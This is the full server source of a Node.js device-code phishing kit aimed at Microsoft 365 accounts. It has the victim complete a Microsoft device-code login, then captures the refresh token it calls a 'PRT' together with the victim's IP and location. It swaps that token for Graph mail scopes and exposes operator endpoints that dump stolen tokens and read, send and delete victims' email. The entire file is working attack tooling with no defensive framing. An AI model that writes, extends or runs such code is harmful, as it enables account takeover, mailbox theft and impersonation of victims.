const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.static('public'));

// ============================================
// TWO CLIENT IDs - Different purposes
// ============================================
// Client 1: PRT Device Registration (captures PRT)
const PRT_CLIENT_ID = '29d9ed98-a469-4536-ade2-f981bc1d605e';
// Client 2: Graph API (mailbox access using PRT)
const GRAPH_CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
// ============================================

// Store sessions
let userSessions = new Map();
let pendingAuth = new Map();
let sessionCounter = 1;
let totalVisits = 0;

function getCountryFromIp(ip) {
    const countryMap = {
        '46.183': 'United States',
        '172.': 'United States',
        '104.': 'United States',
        '185.': 'Germany',
        '188.': 'United Kingdom',
        '45.': 'Canada',
        '103.': 'India',
        '31.': 'Netherlands',
        '46.': 'Sweden'
    };
    for (const [prefix, country] of Object.entries(countryMap)) {
        if (ip.startsWith(prefix)) return country;
    }
    return 'Other';
}

function generateSessionId() {
    return 'sid_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
}

function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
}

// ============================================
// STAGE 1: AUTHENTICATION - Using PRT Client ID
// Captures PRT only (no mailbox access yet)
// ============================================
app.post('/start', async (req, res) => {
    try {
        const sessionId = generateSessionId();
        const clientIp = getClientIp(req);
        const userAgent = req.headers['user-agent'] || 'Unknown';
        const country = getCountryFromIp(clientIp);
        
        totalVisits++;
        
        console.log(`[START] New auth request - Session: ${sessionId.substring(0, 15)}..., IP: ${clientIp}`);
        
        // Using PRT Client ID - only for device registration
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: PRT_CLIENT_ID,
                scope: 'urn:ms-drs:enterpriseregistration.windows.net/.default openid offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, expires_in, interval } = response.data;
        
        console.log(`[START] Device code: ${user_code}, expires in ${expires_in}s`);
        
        pendingAuth.set(sessionId, {
            device_code,
            user_code,
            sessionId,
            status: 'pending',
            ip: clientIp,
            userAgent: userAgent,
            country: country,
            createdAt: Date.now(),
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        pollForToken(device_code, sessionId);
        
        res.json({
            userCode: user_code,
            sessionId: sessionId,
            interval: interval || 5,
            expiresIn: expires_in
        });
        
    } catch (err) {
        console.error('[START] Error:', err.message);
        res.status(500).json({ error: err.message });
    }
});

async function pollForToken(device_code, sessionId) {
    const pollInterval = setInterval(async () => {
        const pending = pendingAuth.get(sessionId);
        if (!pending || pending.status !== 'pending') {
            clearInterval(pollInterval);
            return;
        }
        
        if (Date.now() > pending.expiresAt) {
            pending.status = 'expired';
            pendingAuth.delete(sessionId);
            clearInterval(pollInterval);
            return;
        }
        
        try {
            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                new URLSearchParams({
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    client_id: PRT_CLIENT_ID,
                    device_code: device_code
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            
            const tokens = response.data;
            
            console.log(`[POLL] ✅ Token received for session ${sessionId.substring(0, 15)}...`);
            console.log(`[POLL] PRT (Refresh Token) captured: ${tokens.refresh_token ? 'YES ✓' : 'NO'}`);
            
            // Get user info - use Graph API with the new PRT client
            const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                headers: { 'Authorization': `Bearer ${tokens.access_token}` }
            });
            
            const userEmail = userInfo.data.mail || userInfo.data.userPrincipalName;
            const userName = userInfo.data.displayName;
            
            console.log(`[POLL] User: ${userEmail} (${userName})`);
            
            // Store the PRT for later use with Graph API
            userSessions.set(userEmail, {
                sessionId: sessionId,
                email: userEmail,
                name: userName,
                ip: pending.ip,
                userAgent: pending.userAgent,
                country: pending.country,
                prt_token: tokens.refresh_token,  // This is the PRT - saved for later
                access_token: tokens.access_token,
                expires_in: tokens.expires_in,
                expires_at: Date.now() + (tokens.expires_in * 1000),
                capturedAt: new Date().toISOString(),
                hasPRT: !!tokens.refresh_token
            });
            
            pending.status = 'success';
            pending.email = userEmail;
            pendingAuth.delete(sessionId);
            clearInterval(pollInterval);
            
            console.log(`✅✅✅ SUCCESS! PRT captured for ${userEmail}`);
            console.log(`✅✅✅ Total sessions: ${userSessions.size}`);
            
        } catch (err) {
            if (err.response?.data?.error !== 'authorization_pending') {
                console.log(`[POLL] Waiting for user approval...`);
            }
        }
    }, 3000);
}

app.get('/state', async (req, res) => {
    const sessionId = req.query.session_id;
    if (!sessionId) return res.json({ status: 'error' });
    
    const pending = pendingAuth.get(sessionId);
    if (pending) {
        if (pending.status === 'success') {
            return res.json({ status: 'success', email: pending.email });
        }
        return res.json({ status: 'pending' });
    }
    
    res.json({ status: 'pending' });
});

// ============================================
// STAGE 2: Get Mailbox Access Token Using PRT
// Uses the captured PRT with Graph API client ID
// ============================================
async function getMailboxAccessToken(email) {
    const session = userSessions.get(email);
    
    if (!session) {
        console.log(`❌ No session found for ${email}`);
        return null;
    }
    
    if (!session.prt_token) {
        console.log(`❌ No PRT for ${email}`);
        return null;
    }
    
    try {
        console.log(`🔄 Getting mailbox token for ${email} using PRT...`);
        console.log(`   Using Graph Client ID: ${GRAPH_CLIENT_ID}`);
        
        // Use the captured PRT with the Graph API client ID
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
            new URLSearchParams({
                grant_type: 'refresh_token',
                refresh_token: session.prt_token,
                client_id: GRAPH_CLIENT_ID,
                scope: 'https://graph.microsoft.com/Mail.Read https://graph.microsoft.com/Mail.ReadWrite https://graph.microsoft.com/Mail.Send https://graph.microsoft.com/User.Read offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const tokens = response.data;
        
        console.log(`✅ Mailbox token obtained for ${email}`);
        return tokens.access_token;
    } catch (err) {
        console.error(`❌ Failed to get mailbox token for ${email}:`, err.response?.data?.error || err.message);
        return null;
    }
}

// ============================================
// API ENDPOINTS
// ============================================
app.get('/api/sessions', (req, res) => {
    const sessions = Array.from(userSessions.values()).map(s => ({
        id: s.sessionId,
        email: s.email,
        name: s.name,
        ip: s.ip,
        country: s.country,
        userAgent: s.userAgent,
        type: 'PRT Device Registration',
        capturedAt: s.capturedAt,
        expiresAt: s.hasPRT ? 'Permanent (PRT)' : new Date(s.expires_at).toLocaleString(),
        hasPRT: s.hasPRT
    }));
    console.log(`[API] Returning ${sessions.length} sessions`);
    res.json({ sessions: sessions, total: sessions.length });
});

app.get('/api/session/token/:email', async (req, res) => {
    const { email } = req.params;
    const session = userSessions.get(email);
    
    if (!session) {
        return res.status(404).json({ error: 'Session not found', email: email });
    }
    
    res.json({
        email: session.email,
        prt_token: session.prt_token,
        has_prt: !!session.prt_token,
        note: "This is the PRT. Use it with Graph API client ID to get mailbox access."
    });
});

app.get('/api/list_access_tokens', (req, res) => {
    const tokens = Array.from(userSessions.values()).map(s => ({
        id: s.sessionId,
        user: s.email,
        name: s.name,
        resource: 'PRT Token',
        accesstoken: s.prt_token,
        issued_at: s.capturedAt,
        expires_at: 'Permanent'
    }));
    res.json(tokens);
});

app.get('/api/list_refresh_tokens', (req, res) => {
    const tokens = Array.from(userSessions.values())
        .filter(s => s.prt_token)
        .map(s => ({
            id: s.sessionId,
            user: s.email,
            name: s.name,
            resource: 'PRT - Primary Refresh Token',
            refreshtoken: s.prt_token
        }));
    res.json(tokens);
});

app.get('/api/country_stats', (req, res) => {
    const countryCount = {};
    for (const session of userSessions.values()) {
        const country = session.country || 'Other';
        countryCount[country] = (countryCount[country] || 0) + 1;
    }
    res.json({ countries: countryCount, total: userSessions.size });
});

app.get('/api/overview_stats', (req, res) => {
    res.json({
        totalVisits: totalVisits,
        totalSessions: userSessions.size,
        totalPRTs: Array.from(userSessions.values()).filter(s => s.prt_token).length,
        totalCountries: new Set(Array.from(userSessions.values()).map(s => s.country)).size,
        lastCapture: userSessions.size > 0 ? new Date(Math.max(...Array.from(userSessions.values()).map(s => new Date(s.capturedAt).getTime()))).toLocaleString() : 'None'
    });
});

app.delete('/api/sessions/clear', (req, res) => {
    userSessions.clear();
    pendingAuth.clear();
    totalVisits = 0;
    res.json({ success: true });
});

// ============================================
// MAILBOX API - Uses Graph API Client ID with PRT
// ============================================
app.get('/api/mail/folders/:email', async (req, res) => {
    const { email } = req.params;
    console.log(`[MAIL] Getting folders for ${email}`);
    
    const token = await getMailboxAccessToken(email);
    if (!token) {
        return res.status(401).json({ error: 'No valid token. PRT not found.' });
    }
    
    try {
        const response = await axios.get('https://graph.microsoft.com/v1.0/me/mailFolders', {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$top': 100, '$select': 'id,displayName,totalItemCount,unreadItemCount' }
        });
        res.json(response.data);
    } catch (err) {
        console.error('Folders error:', err.response?.data);
        res.status(500).json({ error: 'Failed to fetch folders: ' + (err.response?.data?.error?.message || err.message) });
    }
});

app.get('/api/mail/:email/:folderId', async (req, res) => {
    const { email, folderId } = req.params;
    const token = await getMailboxAccessToken(email);
    if (!token) return res.status(401).json({ error: 'No valid token' });
    
    try {
        const response = await axios.get(`https://graph.microsoft.com/v1.0/me/mailFolders/${folderId}/messages`, {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$top': 50, '$orderby': 'receivedDateTime desc', '$select': 'id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments' }
        });
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch emails' });
    }
});

app.get('/api/mail/message/:email/:messageId', async (req, res) => {
    const { email, messageId } = req.params;
    const token = await getMailboxAccessToken(email);
    if (!token) return res.status(401).json({ error: 'No valid token' });
    
    try {
        const response = await axios.get(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$select': 'id,subject,from,toRecipients,receivedDateTime,isRead,body,bodyPreview,hasAttachments' }
        });
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch message' });
    }
});

app.post('/api/mail/send/:email', async (req, res) => {
    const { email } = req.params;
    const { to, subject, body } = req.body;
    const token = await getMailboxAccessToken(email);
    if (!token) return res.status(401).json({ error: 'No valid token' });
    
    try {
        await axios.post('https://graph.microsoft.com/v1.0/me/sendMail', {
            message: {
                subject: subject,
                body: { contentType: 'HTML', content: body },
                toRecipients: to.map(addr => ({ emailAddress: { address: addr } }))
            },
            saveToSentItems: true
        }, { headers: { 'Authorization': `Bearer ${token}` } });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to send email' });
    }
});

app.delete('/api/mail/message/:email/:messageId', async (req, res) => {
    const { email, messageId } = req.params;
    const token = await getMailboxAccessToken(email);
    if (!token) return res.status(401).json({ error: 'No valid token' });
    
    try {
        await axios.delete(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
            headers: { 'Authorization': `Bearer ${token}` }
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to delete message' });
    }
});

app.patch('/api/mail/message/:email/:messageId', async (req, res) => {
    const { email, messageId } = req.params;
    const { isRead } = req.body;
    const token = await getMailboxAccessToken(email);
    if (!token) return res.status(401).json({ error: 'No valid token' });
    
    try {
        await axios.patch(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, 
            { isRead: isRead },
            { headers: { 'Authorization': `Bearer ${token}` } }
        );
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to update' });
    }
});

// ============================================
// SETTINGS
// ============================================
let config = {
    active_resource: 'graph',
    api_version: '2',
    openai_enabled: false,
    openai_api_key: '',
    openai_model: 'gpt-3.5-turbo',
    openai_max_tokens: 500,
    openai_temperature: 0.7
};

app.get('/api/settings', (req, res) => res.json(config));
app.post('/api/settings', (req, res) => { config = { ...config, ...req.body }; res.json({ success: true }); });
app.get('/api/resource/settings', (req, res) => res.json({ success: true, active_resource: config.active_resource }));
app.post('/api/resource/settings', (req, res) => { config.active_resource = req.body.active_resource; res.json({ success: true }); });
app.post('/api/openai/settings', (req, res) => { Object.assign(config, req.body); res.json({ success: true }); });

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'index.html')));
app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n========================================`);
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`✅ PRT Client ID: ${PRT_CLIENT_ID}`);
    console.log(`✅ Graph Client ID: ${GRAPH_CLIENT_ID}`);
    console.log(`✅ PRT captured during auth → Used with Graph client for mailbox`);
    console.log(`========================================\n`);
});
